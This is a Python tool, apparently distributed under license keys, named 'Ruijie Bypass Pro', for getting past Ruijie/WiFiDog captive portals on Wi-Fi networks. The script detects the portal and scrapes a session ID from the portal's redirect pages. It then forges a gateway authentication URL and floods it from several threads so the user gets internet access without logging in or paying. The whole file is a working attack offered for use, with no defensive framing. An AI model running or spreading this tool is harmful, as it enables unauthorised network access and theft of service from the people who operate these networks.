import os
import subprocess
import sys

# တိုလီမိုလီ Tool များ အလိုအလျောက် ဒေါင်းပေးမည့်စနစ်
def install_dependencies():
    try:
        import requests
    except ImportError:
        print("\033[96m[*] Installing missing tools... Please wait.\033[0m")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "urllib3"])
        os.execl(sys.executable, sys.executable, *sys.argv)

install_dependencies()

import requests
import re
import urllib3
import time
import threading
import logging
import random
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG & REMOTE KEY SYSTEM
# ===============================
# ဒီနေရာမှာ သင့်ရဲ့ Raw Link ကို အမှန်ထည့်ပေးထားပါတယ်
KEY_URL = "https://raw.githubusercontent.com/tmmt6132-coder/Bypass/main/keys.txt"

PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

# ===============================
# COLOR SYSTEM
# ===============================
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

stop_event = threading.Event()

def validate_key():
    print(f"{CYAN}[*] Checking License Key...{RESET}")
    user_key = input(f"{YELLOW}Enter your Key ID: {RESET}").strip()
    
    try:
        response = requests.get(KEY_URL, timeout=10)
        if response.status_code != 200:
            print(f"{RED}[!] Error: Could not connect to Key Server.{RESET}")
            sys.exit()
            
        key_data = response.text.splitlines()
        valid = False
        
        for line in key_data:
            if ":" in line:
                k, expiry_str = line.split(":")
                if k.strip() == user_key:
                    expiry_date = datetime.strptime(expiry_str.strip(), "%Y-%m-%d")
                    if expiry_date > datetime.now():
                        print(f"{GREEN}[✓] Access Granted! (Expires: {expiry_str}){RESET}")
                        valid = True
                        break
                    else:
                        print(f"{RED}[!] Key Expired on {expiry_str}{RESET}")
                        sys.exit()
        
        if not valid:
            print(f"{RED}[!] Invalid Key ID.{RESET}")
            sys.exit()
            
    except Exception as e:
        print(f"{RED}[!] Validation Error: {e}{RESET}")
        sys.exit()

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=2).status_code == 200
    except:
        return False

def banner():
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║        Ruijie Bypass Pro             ║
║        Key-Protected Edition         ║
╚══════════════════════════════════════╝
{RESET}""")

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=5, verify=False)
            print(f"{GREEN}[✓]{RESET} SID {sid} | Pulse Active...     ", end="\r")
        except:
            break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_process():
    banner()
    validate_key()
    
    logging.info(f"{CYAN}Starting Bypass Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)

            if r.status_code == 204 and check_real_internet():
                print(f"{YELLOW}[•]{RESET} Internet Connected... Monitoring     ", end="\r")
                time.sleep(5)
                continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            
            print(f"\n{CYAN}[*] Portal Detected. Capturing SID...{RESET}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            query_params = parse_qs(urlparse(r2.url).query)
            sid = query_params.get('sessionId', [None])[0]

            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if sid:
                print(f"{GREEN}[✓]{RESET} Session ID: {sid}")
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

                while check_real_internet():
                    time.sleep(10)
            else:
                time.sleep(3)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}Stopped.{RESET}")
        
